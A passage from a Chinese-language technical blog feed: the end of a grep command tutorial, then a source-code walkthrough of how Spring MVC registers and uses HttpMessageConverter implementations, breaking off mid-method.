<h3 id="grep-H"><a href="#grep-H" class="headerlink" title="grep -H"></a><code>grep -H</code></h3><p>在匹配行的前面同时输出文件名</p>
<p><code>grep -H &#39;watch&#39; test.txt</code></p>
<blockquote>
<p>test.txt:”Night gathers, and now my watch begins. It shall not end<br>test.txt:watcher on the walls. I am the shield that guards the realms of</p>
</blockquote>
<h2 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h2><h3 id="grep-–color"><a href="#grep-–color" class="headerlink" title="grep –color"></a>grep –color</h3><p><code>grep -H --color &#39;watch&#39; test.txt</code></p>
<img src="/2016/12/07/grep/color.jpg">
<h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><p>在用户目录下的<code>.bashrc</code>中设置环境变量，也可以达到高亮的目的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GREP_OPTIONS=<span class="string">'--color=auto'</span></span><br></pre></td></tr></table></figure>
<p>添加之后记得<code>source ~/.bashrc</code>, 然后才能生效</p>
<h2 id="egrep"><a href="#egrep" class="headerlink" title="egrep"></a>egrep</h2><blockquote>
<p>egrep 命令与 grep 命令带 -E 标志是一样的，除了错误消息和使用情况消息不同以及 -s 标志的功能不同之外。</p>
</blockquote>
<h3 id="多关键字"><a href="#多关键字" class="headerlink" title="多关键字"></a>多关键字</h3><p>使用正则就可以同时搜索多个关键字</p>
<p><code>grep -E &#39;keyword1 | keyword2&#39; filename</code></p>
<p><code>grep --color -E  &#39;am | to&#39; test.txt</code></p>
<img src="/2016/12/07/grep/egrep.jpg">
<h2 id="zgrep"><a href="#zgrep" class="headerlink" title="zgrep"></a>zgrep</h2><p>zgrep 可以在压缩文件中搜索内容</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://www.cyberciti.biz/faq/howto-use-grep-command-in-linux-unix/" rel="external nofollow noopener noreferrer" target="_blank">HowTo: Use grep Command In Linux / UNIX – Examples</a></p>
</li>
<li><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.cmds2/egrep.htm" rel="external nofollow noopener noreferrer" target="_blank">egrep 命令 - IBM</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[HttpMessageConverter 原理和源码]]></title>
      <url>http://qsli.github.io/2016/11/29/HttpMessageConverter/</url>
      <content type="html"><![CDATA[<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><img src="/2016/11/29/HttpMessageConverter/arch.jpg">
<h2 id="HttpMessageConverter接口"><a href="#HttpMessageConverter接口" class="headerlink" title="HttpMessageConverter接口"></a>HttpMessageConverter接口</h2><img src="/2016/11/29/HttpMessageConverter/http-message-converter.jpg" title=") >`HttpMessageConverter` used to marshal objects into the HTTP request body and to unmarshal any response back into an object. 提供将Java中的对象和http请求、响应相互转换的功能 ### spring 中的配置 xml配置示例： undefined java配置示例： undefined ### 接口描述 undefined ### spring 提供的实现类 {% asset_img inherit.jpg">
<table>
<thead>
<tr>
<th>名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>ByteArrayHttpMessageConverter</td>
</tr>
<tr>
<td>FormHttpMessageConverter</td>
</tr>
<tr>
<td>XmlAwareFormHttpMessageConverter</td>
</tr>
<tr>
<td>ResourceHttpMessageConverter</td>
</tr>
<tr>
<td>SourceHttpMessageConverter</td>
</tr>
<tr>
<td>StringHttpMessageConverter</td>
</tr>
<tr>
<td>SimpleXmlHttpMessageConverter</td>
</tr>
<tr>
<td>MappingJackson2HttpMessageConverter</td>
</tr>
<tr>
<td>GsonHttpMessageConverter</td>
</tr>
<tr>
<td>SyndFeedHttpMessageConverter</td>
</tr>
<tr>
<td>RssChannelHttpMessageConverter</td>
</tr>
<tr>
<td>AtomFeedHttpMessageConverter</td>
</tr>
</tbody>
</table>
<p>具体功能见 <a href="http://docs.spring.io/autorepo/docs/spring-android/1.0.x/reference/html/rest-template.html" rel="external nofollow noopener noreferrer" target="_blank">RestTemplate Module</a></p>
<p>想研究源码的可以从最简单的 <code>StringHttpMessageConverter</code>看起</p>
<h2 id="Spring调用过程"><a href="#Spring调用过程" class="headerlink" title="Spring调用过程"></a>Spring调用过程</h2><p>在DispatcherServlet初始化的过程会调用一个叫做<code>initHandlerAdapters</code>的方法，<br>该方法内部会扫描容器中所有的类，以及他们的父类，找到所有实现了<code>HandlerAdapter</code>接口的类，<br>并将他们注册到<code>DispatcherServlet</code>的<code>HandlerAdapters</code>中。</p>
<p>如果没有扫描到的HandlerAdapter，这个方法会加载一些默认的HandlerAdapter。</p>
<blockquote>
<p>The default implementation uses the “DispatcherServlet.properties” file (in the same<br>  package as the DispatcherServlet class) to determine the class names. </p>
</blockquote>
  <img src="/2016/11/29/HttpMessageConverter/DispatcherServlet-properties.jpg">
<p>Spring 4.3.2 中有一个实现了<code>HandlerAdapter</code>接口的类会被扫描到，这个类叫做<code>RequestMappingHandlerAdapter</code></p>
<h3 id="RequestMappingHandlerAdapter"><a href="#RequestMappingHandlerAdapter" class="headerlink" title="RequestMappingHandlerAdapter"></a>RequestMappingHandlerAdapter</h3><p>这个类在构造的时候就加载了许多messageConverter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RequestMappingHandlerAdapter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringHttpMessageConverter stringHttpMessageConverter = <span class="keyword">new</span> StringHttpMessageConverter();</span><br><span class="line">    stringHttpMessageConverter.setWriteAcceptCharset(<span class="keyword">false</span>);  <span class="comment">// see SPR-7316</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.messageConverters = <span class="keyword">new</span> ArrayList&lt;HttpMessageConverter&lt;?&gt;&gt;(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> ByteArrayHttpMessageConverter());</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(stringHttpMessageConverter);</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> SourceHttpMessageConverter&lt;Source&gt;());</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> AllEncompassingFormHttpMessageConverter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>AllEncompassingFormHttpMessageConverter</code>继承自<code>FormHttpMessageConverter</code>， 它有一个变量叫做<br><code>partConverters</code>，存储了一系列的<code>HttpMessageConverter</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; partConverters = <span class="keyword">new</span> ArrayList&lt;HttpMessageConverter&lt;?&gt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FormHttpMessageConverter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.supportedMediaTypes.add(MediaType.APPLICATION_FORM_URLENCODED);</span><br><span class="line">    <span class="keyword">this</span>.supportedMediaTypes.add(MediaType.MULTIPART_FORM_DATA);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(<span class="keyword">new</span> ByteArrayHttpMessageConverter());</span><br><span class="line">    StringHttpMessageConverter stringHttpMessageConverter = <span class="keyword">new</span> StringHttpMessageConverter();</span><br><span class="line">    stringHttpMessageConverter.setWriteAcceptCharset(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(stringHttpMessageConverter);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(<span class="keyword">new</span> ResourceHttpMessageConverter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在<code>AllEncompassingFormHttpMessageConverter</code>中又根据classPath中是否包含jackson、Gson等jar包来动态的<br>注册了一些<code>HttpMessageConverter</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AllEncompassingFormHttpMessageConverter</span> <span class="keyword">extends</span> <span class="title">FormHttpMessageConverter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jaxb2Present =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"javax.xml.bind.Binder"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jackson2Present =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.fasterxml.jackson.databind.ObjectMapper"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()) &amp;&amp;</span></span><br><span class="line">                    ClassUtils.isPresent("com.fasterxml.jackson.core.JsonGenerator", AllEncompassingFormHttpMessageConverter.class.getClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jackson2XmlPresent =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.fasterxml.jackson.dataformat.xml.XmlMapper"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> gsonPresent =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.google.gson.Gson"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AllEncompassingFormHttpMessageConverter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        addPartConverter(<span class="keyword">new</span> SourceHttpMessageConverter&lt;Source&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jaxb2Present &amp;&amp; !jackson2Present) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> Jaxb2RootElementHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jackson2Present) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> MappingJackson2HttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (gsonPresent) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> GsonHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jackson2XmlPresent) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> MappingJackson2XmlHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至于这些转换器是怎么使用的，要看<code>RequestMappingHandlerAdapter</code>中的<code>getDefaultArgumentResolver</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the list of argument resolvers to use including built-in resolvers</span></span><br><span class="line"><span class="comment">     * and custom resolvers provided via &#123;<span class="doctag">@link</span> #setCustomArgumentResolvers&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;HandlerMethodArgumentResolver&gt; <span class="title">getDefaultArgumentResolvers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;HandlerMethodArgumentResolver&gt; resolvers = <span class="keyword">new</span> ArrayList&lt;HandlerMethodArgumentResolver&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Annotation-based argument resolution</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMethodArgumentResolver(getBeanFactory(), <span class="keyword">false</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> PathVariableMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> PathVariableMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MatrixVariableMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MatrixVariableMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletModelAttributeMethodProcessor(<span class="keyword">false</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestResponseBodyMethodProcessor(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestPartMethodArgumentResolver(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestHeaderMethodArgumentResolver(getBeanFactory()));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestHeaderMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletCookieValueMethodArgumentResolver(getBeanFactory()));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ExpressionValueMethodArgumentResolver(getBeanFactory()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Type-based argument resolution</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletRequestMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletResponseMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> HttpEntityMethodProcessor(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RedirectAttributesMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ModelMethodProcessor());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MapMethodProcessor());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ErrorsMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> SessionStatusMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> UriComponentsBuilderMethodArgumentResolver());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Custom arguments</span></span><br><span class="line">        <span class="keyword">if</span> (getCustomArgumentResolvers() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            resolvers.addAll(getCustomArgumentResolvers());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Catch-all</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMethodArgumentResolver(getBeanFactory(), <span class="keyword">true</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletModelAttributeMethodProcessor(<span class="keyword">true</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resolvers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到所有的Converter最终作为一个构造参数传入了<code>RequestResponseBodyMethodProcessor</code>和<code>RequestPartMethodArgumentResolver</code>。 前者其实是负责处理<code>@RequestBody</code>和<code>@ResponseBody</code>的,<br>后者则是处理<code>@RequestPart</code>这个注解的。拿<code>RequestResponseBodyMethodProcessor</code>为例来看。</p>
<p>这个类的父类实现了<code>HandlerMethodReturnValueHandler</code>接口，这个接口的作用对照上面的系统整体架构图<br>可知，是处理Controller返回的结果值的，看其<code>handleReturnValue</code>方法 。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">        ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line">    mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// Try even with null return value. ResponseBodyAdvice could get involved.</span></span><br><span class="line">    writeWithMessageConverters(returnValue, returnType, webRequest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先标记这个请求已经处理过了，然后调用了一个内部方法，从名字就可以看出来，是使用MessageConverter进行<br>转换。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes the given return value to the given web request. Delegates to</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #writeWithMessageConverters(Object, MethodParameter, ServletServerHttpRequest, ServletServerHttpResponse)&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">writeWithMessageConverters</span><span class="params">(T returnValue, MethodParameter returnType, NativeWebRequest webRequest)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ServletServerHttpRequest inputMessage = createInputMessage(webRequest);</span><br><span class="line">    ServletServerHttpResponse outputMessage = createOutputMessage(webRequest);</span><br><span class="line">    writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>真正的逻辑还是内部的`writeWithMessageConveters()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes the given return type to the given output message.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnValue the value to write to the output message</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnType the type of the value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputMessage the input messages. Used to inspect the &#123;<span class="doctag">@code</span> Accept&#125; header.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputMessage the output message to write to</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException thrown in case of I/O errors</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpMediaTypeNotAcceptableException thrown when the conditions indicated by &#123;<span class="doctag">@code</span> Accept&#125; header on</span></span><br><span class="line"><span class="comment">     * the request cannot be met by the message converters</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">writeWithMessageConverters</span><span class="params">(T returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">            ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; returnValueClass = getReturnValueType(returnValue, returnType);</span><br><span class="line">        Type returnValueType = getGenericType(returnType);</span><br><span class="line">        HttpServletRequest servletRequest = inputMessage.getServletRequest();</span><br><span class="line">        <span class="comment">//从请求头获取可能的返回类型（默认会加载两种策略，比如从路径名的后缀上推断）</span></span><br><span class="line">        List&lt;MediaType&gt; requestedMediaTypes = getAcceptableMediaTypes(servletRequest);</span><br><span class="line">        <span class="comment">//根据请求和返回的值得类型，推断可能的返回值类型</span></span><br><span class="line">        List&lt;MediaType&gt; producibleMediaTypes = getProducibleMediaTypes(servletRequest, returnValueClass, returnValueType);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span> &amp;&amp; producibleMediaTypes.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No converter found for return value of type: "</span> + returnValueClass);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//筛选</span></span><br><span class="line">        Set&lt;MediaType&gt; compatibleMediaTypes = <span class="keyword">new</span> LinkedHashSet&lt;MediaType&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MediaType requestedType : requestedMediaTypes) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MediaType producibleType : producibleMediaTypes) &#123;</span><br><span class="line">                <span class="keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;</span><br><span class="line">                    compatibleMediaTypes.add(getMostSpecificMediaType(requestedType, producibleType));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (compatibleMediaTypes.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpMediaTypeNotAcceptableException(producibleMediaTypes);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;MediaType&gt; mediaTypes = <span class="keyword">new</span> ArrayList&lt;MediaType&gt;(compatibleMediaTypes);</span><br><span class="line">        MediaType.sortBySpecificityAndQuality(mediaTypes);</span><br><span class="line"></span><br><span class="line">        MediaType selectedMediaType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (MediaType mediaType : mediaTypes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mediaType.isConcrete()) &#123;<span class="comment">//具体的，没有通配符的</span></span><br><span class="line">                selectedMediaType = mediaType;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// 找到一个就跳出循环</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mediaType.equals(MediaType.ALL) || mediaType.equals(MEDIA_TYPE_APPLICATION)) &#123;</span><br><span class="line">                selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// 找到一个就跳出循环</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//找到能处理这种类型的HttpMessageConverter</span></span><br><span class="line">        <span class="keyword">if</span> (selectedMediaType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            selectedMediaType = selectedMediaType.removeQualityValue();</span><br><span class="line">            <span class="keyword">for</span> (HttpMessageConverter&lt;?&gt; messageConverter : <span class="keyword">this</span>.messageConverters) &#123;</span><br><span class="line">                <span class="keyword">if</span> (messageConverter <span class="keyword">instanceof</span> GenericHttpMessageConverter) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((GenericHttpMessageConverter&lt;T&gt;) messageConverter).canWrite(returnValueType,</span><br><span class="line">                            returnValueClass, selectedMediaType)) &#123;</span><br><span class="line">                        returnValue = (T) getAdvice().beforeBodyWrite(returnValue, returnType, selectedMediaType,</span><br><span class="line">                                (Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt;) messageConverter.getClass(),</span><br><span class="line">                                inputMessage, outputMessage);</span><br><span class="line">                        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            addContentDispositionHeader(inputMessage, outputMessage);</span><br><span class="line">                            ((GenericHttpMessageConverter&lt;T&gt;) messageConverter).write(returnValue,</span><br><span class="line">                                    returnValueType, selectedMediaType, outputMessage);</span><br><span class="line">                            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                                logger.debug(<span class="string">"Written ["</span> + returnValue + <span class="string">"] as \""</span> +</span><br><span class="line">                                        selectedMediaType + <span class="string">"\" using ["</span> + messageConverter + <span class="string">"]"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (messageConverter.canWrite(returnValueClass, selectedMediaType)) &#123;</span><br><span class="line">                    returnValue = (T) getAdvice().beforeBodyWrite(returnValue, returnType, selectedMediaType,</span><br><span class="line">                            (Class&lt;? extends 